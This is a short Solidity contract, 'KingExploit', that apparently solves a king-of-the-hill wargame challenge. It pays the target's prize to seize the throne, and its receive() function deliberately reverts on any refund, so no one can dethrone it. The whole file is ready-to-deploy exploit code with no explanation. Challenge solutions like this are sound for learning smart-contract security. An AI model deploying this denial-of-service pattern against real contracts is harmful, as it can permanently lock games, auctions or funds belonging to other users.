// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface King {
    function prize() external view returns (uint256);
    function owner() external view returns (address);
    function _king() external view returns (address);
}

contract KingExploit {
    address payable owner;
    King king;

    constructor(address _king) payable {
        owner = payable(msg.sender);
        king = King(payable(_king));
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function becomeKing() public onlyOwner {
        uint256 prize = king.prize();
        (bool success,) = address(king).call{value: prize}("");
        require(success, "becomeKing() failed because call failed");
    }

    receive() external payable {
        owner.transfer(address(this).balance + 1);
    }
}
